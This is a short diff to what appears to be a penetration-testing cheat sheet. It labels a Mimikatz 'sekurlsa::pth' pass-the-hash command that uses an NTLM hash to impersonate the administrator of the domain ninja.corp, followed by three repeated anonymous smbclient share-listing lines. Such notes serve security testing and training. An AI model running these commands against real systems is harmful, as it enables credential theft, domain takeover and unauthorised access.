@@ -136,7 +136,7 @@
 
 | MiMiKatz  |
 | ------------- |
-|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|
+|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "' ###Pass-the-Hash|
 | smbclient -N -L \\\\10.10.10.103 |
 | smbclient -N -L \\\\10.10.10.103 |
 | smbclient -N -L \\\\10.10.10.103 |
